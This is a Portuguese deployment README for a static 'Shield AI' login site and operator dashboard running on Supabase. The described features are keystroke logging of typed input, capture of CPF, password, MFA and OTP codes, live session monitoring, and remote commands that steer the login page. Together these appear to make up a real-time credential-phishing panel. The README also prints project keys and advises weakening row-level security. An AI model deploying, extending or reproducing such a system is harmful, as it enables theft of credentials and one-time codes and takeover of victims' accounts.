# 🚀 Shield AI - Pronto para Produção

Este projeto está **100% pronto para usar com Supabase direto** - sem depender de nenhuma API intermediária.

---

## ✅ O Que Está Configurado

- ✅ **Login** conectado ao Supabase
- ✅ **Dashboard** conectado ao Supabase  
- ✅ **Eventos & Logs** salvos direto no Supabase
- ✅ **Comandos** enviados direto via Supabase
- ✅ **Real-time** via Supabase Realtime (Broadcast)

---

## 📋 Configuração do Supabase (O QUE JÁ ESTÁ FEITO)

As credenciais estão no `config.js`:

```javascript
SUPABASE_URL: 'https://pfbgsviarvnkaadrkxfd.supabase.co'
SUPABASE_ANON_KEY: 'sb_publishable_vMQXPTlWH30Bys_bgojo5A_IdyjXEdH'
```

**Tabelas necessárias (você deve verificar no seu Supabase):**
- `events` - Eventos de autenticação
- `logs` - Keystrokes e logs do sistema
- `commands` - Comandos do dashboard

---

## 🌐 COMO FAZER DEPLOY

### **Opção 1: Netlify (Recomendado)**

```bash
# 1. Fazer login no Netlify
netlify login

# 2. Conectar ao repositório GitHub
netlify connect

# 3. Configurar build (se necessário)
# Deixe em branco - é site estático
```

**Ou pelo dashboard Netlify:**
1. Conecte seu GitHub
2. Selecione o repositório
3. Configure como site estático
4. Deploy automático ao fazer push

### **Opção 2: Outro Servidor**

```bash
# Copiar a pasta para seu servidor
# O projeto é 100% estático - apenas abra index.html no navegador
```

---

## 🔗 URLS

Após deploy, você vai ter:

```
Site Login:    https://seu-dominio.com
Dashboard:     https://seu-dominio.com/dashboard/
```

**OU em domínios separados:**

```
Site Login:    https://login.seu-dominio.com
Dashboard:     https://admin.seu-dominio.com
```

---

## 🎯 PRÓXIMAS ETAPAS

### **1. Verificar RLS no Supabase**

Se encontrar erro ao salvar eventos, pode ser RLS restritivo:

```sql
-- Opção A: Permitir tudo (menos seguro, para teste)
DROP POLICY IF EXISTS "Enable all for authenticated users" ON events;

-- Opção B: Configurar RLS adequadamente
-- (Consulte a documentação do Supabase)
```

### **2. Testar o Fluxo Completo**

1. Abra o site de login
2. Preencha os campos (vai salvar eventos em tempo real)
3. Abra o dashboard em outra aba
4. Veja os eventos chegando em tempo real
5. Envie um comando do dashboard
6. Veja o login reagir ao comando

### **3. Configurar CORS (Se Necessário)**

Se tiver erro de CORS, é porque está acessando de domínios diferentes. Supabase já tem CORS aberto por padrão - geralmente não é necessário fazer nada.

---

## 🔐 Segurança

- **Credenciais públicas**: A anon_key é **pública por design** - é usada no frontend
- **Proteção**: O Supabase usa **Row-Level Security (RLS)** para proteger os dados
- **Recomendação**: Configure RLS policies no seu Supabase para:
  - Permitir apenas certos usuários/IPs leram/escreverem
  - Ou use um servidor intermediário em produção

---

## 📊 Tabelas Esperadas no Supabase

```
eventos
├── id (UUID)
├── tipo (TEXT)
├── mensagem (TEXT)
├── status (TEXT)
├── usuario (TEXT)
├── ip (TEXT)
├── user_agent (TEXT)
├── step (TEXT)
└── created_at (TIMESTAMP)

logs
├── id (UUID)
├── level (TEXT)
├── categoria (TEXT)
├── mensagem (TEXT)
├── detalhes (JSONB)
└── created_at (TIMESTAMP)

commands
├── id (UUID)
├── acao (TEXT)
├── payload (JSONB)
└── created_at (TIMESTAMP)
```

---

## 🆘 Troubleshooting

### "Erro ao salvar eventos"
→ Verificar RLS policies no Supabase  
→ Permitir insert/select/delete para anon_key

### "Dashboard não recebe eventos"
→ Verificar conexão do Supabase  
→ Verificar Realtime ativado no Supabase  
→ Verificar console do navegador

### "Comandos não funcionam"
→ Verificar se a tabela `commands` existe  
→ Verificar RLS permite insert

---

## ✨ Recursos do Sistema

- ✅ Login com 5 steps (Email/CPF, Senha, MFA, OTP)
- ✅ Keystroke logging em tempo real
- ✅ Dashboard com monitoramento de sessões
- ✅ Envio de comandos remotos
- ✅ Status em tempo real (Aguardando, Conectado, etc)
- ✅ Limpeza de eventos/logs
- ✅ Broadcast em tempo real via Supabase

---

## 📝 Notas Finais

- O projeto **não usa nenhuma API** - tudo é via Supabase
- Deploy é **instantâneo** - é site estático puro
- Escalabilidade **automática** - Supabase gerencia tudo
- Custo **baixo** - Supabase tem plano grátis generoso

---

**Pronto para deploy! 🚀**

Data: 29/05/2026
Versão: 1.0 (100% Supabase)
